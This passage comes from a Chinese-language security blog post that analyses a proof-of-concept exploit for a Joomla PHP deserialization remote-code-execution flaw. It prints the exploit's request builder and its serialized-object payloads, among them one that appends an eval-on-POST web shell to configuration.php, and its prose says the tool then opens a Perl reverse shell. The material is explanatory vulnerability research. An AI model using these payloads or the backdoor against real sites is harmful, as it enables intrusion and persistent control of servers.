+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>(check(url)):</span><br><span class="line">        print_ok(<span class="string">'Vulnerable'</span>)</span><br><span class="line">        <span class="keyword">if</span> args[<span class="string">'exploit'</span>]:</span><br><span class="line">            exploit(url, args[<span class="string">'lhost'</span>], args[<span class="string">'lport'</span>])</span><br></pre></td></tr></table></figure>
+<p>check函数会访问index.php/component/users，也就是登录页面，并调用make_req发送payload，然后检查返回的页面是否存在check_string</p>
+<p>make_req模仿用户的登录，构造username和password，将payload拼接到password后面并发送</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_req</span><span class="params">(url, object_payload)</span>:</span></span><br><span class="line">    <span class="comment"># just make a req with object</span></span><br><span class="line">    print_info(<span class="string">'Getting Session Cookie ..'</span>)</span><br><span class="line">    cook = get_cook(url)</span><br><span class="line">    print_info(<span class="string">'Getting CSRF Token ..'</span>)</span><br><span class="line">    csrf = get_token(url, cook)</span><br><span class="line"></span><br><span class="line">    user_payload = <span class="string">'\\0\\0\\0'</span> * <span class="number">9</span></span><br><span class="line">    padding = <span class="string">'AAA'</span>  <span class="comment"># It will land at this padding</span></span><br><span class="line"></span><br><span class="line">    inj_object = <span class="string">'";'</span></span><br><span class="line">    inj_object += object_payload</span><br><span class="line">    <span class="comment"># inj_object += 's:6:"return";s:102:'  # end the object with the 'return' part       not necessary ?</span></span><br><span class="line">    password_payload = padding + inj_object</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'username'</span>: user_payload,</span><br><span class="line">        <span class="string">'password'</span>: password_payload,</span><br><span class="line">        <span class="string">'option'</span>: <span class="string">'com_users'</span>,</span><br><span class="line">        <span class="string">'task'</span>: <span class="string">'user.login'</span>,</span><br><span class="line">        csrf: <span class="string">'1'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    print_info(<span class="string">'Sending request ..'</span>)</span><br><span class="line">    print_info(<span class="string">"params"</span>)</span><br><span class="line">    print(params)</span><br><span class="line">    resp = requests.post(url, proxies=PROXS, cookies=cook, data=params)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br></pre></td></tr></table></figure>
+
+<p>第一次发出的payload主要是在当前页面中打印一个随机的字符串，相当于执行print_r(‘<a href="http://l4m3rz.l337/;kbpbhqaaogxswlcumdut&#39;)，如果登录失败的页面中存在kbpbhqaaogxswlcumdut，则说明存在漏洞" target="_blank" rel="noopener">http://l4m3rz.l337/;kbpbhqaaogxswlcumdut&#39;)，如果登录失败的页面中存在kbpbhqaaogxswlcumdut，则说明存在漏洞</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gen_pay(<span class="string">'print_r'</span>, check_string)</span><br><span class="line">payload: &#123;</span><br><span class="line"><span class="string">'username'</span>: <span class="string">'\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0'</span>, </span><br><span class="line"><span class="string">'password'</span>: <span class="string">' 省略··· s:19:"cache_name_function";s:7:"print_r";s:10:"javascript";i:9999;s:8:"feed_url";s:40:"http://l4m3rz.l337/;kbpbhqaaogxswlcumdut";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span>, </span><br><span class="line"><span class="string">'option'</span>: <span class="string">'com_users'</span>, </span><br><span class="line"><span class="string">'task'</span>: <span class="string">'user.login'</span>, </span><br><span class="line"><span class="string">'f66b6dbbd8ecd35ff5da93f6de4ee999'</span>: <span class="string">'1'</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二次发出的payload则是在configuration.php下写入一个shell，相当于执行assert(file_put_contents(‘configuration.php’,’if(isset($_POST[‘backdoor_param’])) eval($_POST[‘backdoor_param’]);’, FILE_APPEND) || $a=’<a href="http://wtf&#39;" target="_blank" rel="noopener">http://wtf&#39;</a>)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_backdoor_pay</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># This payload will backdoor the the configuration .PHP with an eval on POST request</span></span><br><span class="line"></span><br><span class="line">    function = <span class="string">'assert'</span></span><br><span class="line">    payload = <span class="string">'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\''</span> + backdoor_param + <span class="string">'\\\'])) eval($_POST[\\\''</span> + backdoor_param + <span class="string">'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/joomla/9.png" alt></p>
+<p>最后exploit函数会使用configuration.php中的shell，基于系统的perl环境生成一个反弹shell</p>
+<p>整个流程如下<br><img src="/2020/04/25/joomla/10.png" alt></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41" target="_blank" rel="noopener">https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41</a></li>
+<li><a href="https://www.cnblogs.com/magic-zero/p/11643916.html" target="_blank" rel="noopener">https://www.cnblogs.com/magic-zero/p/11643916.html</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+            <a href="/tags/Joomla/" rel="tag"># Joomla</a>
+          
+            <a href="/tags/unserialize/" rel="tag"># unserialize</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/04/NoColumnInjection-BypassInformation-schema/" rel="next" title="NoColumnInjection&BypassInformation_schema">
+                <i class="fa fa-chevron-left"></i> NoColumnInjection&BypassInformation_schema
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/12/tps2/" rel="prev" title="thinkphp5.0.0 ~ 5.0.23 RCE">
+                thinkphp5.0.0 ~ 5.0.23 RCE <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">0pa9ue</p>
+              <p class="site-description motion-element" itemprop="description">stay hungry, stay foolish</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-反序列化字符逃逸"><span class="nav-number">2.</span> <span class="nav-text">PHP 反序列化字符逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#特性"><span class="nav-number">2.1.</span> <span class="nav-text">特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#v0"><span class="nav-number">2.1.1.</span> <span class="nav-text">v0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#v1"><span class="nav-number">2.1.2.</span> <span class="nav-text">v1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#v2"><span class="nav-number">2.1.3.</span> <span class="nav-text">v2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#v3"><span class="nav-number">2.1.4.</span> <span class="nav-text">v3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#逃逸分析"><span class="nav-number">2.2.</span> <span class="nav-text">逃逸分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#示例一"><span class="nav-number">2.2.1.</span> <span class="nav-text">示例一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#示例二"><span class="nav-number">2.2.2.</span> <span class="nav-text">示例二</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Joomla-RCE"><span class="nav-number">3.</span> <span class="nav-text">Joomla RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理分析"><span class="nav-number">3.1.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#模拟"><span class="nav-number">3.2.</span> <span class="nav-text">模拟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC简析"><span class="nav-number">3.3.</span> <span class="nav-text">POC简析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0pa9ue</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">44.4k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
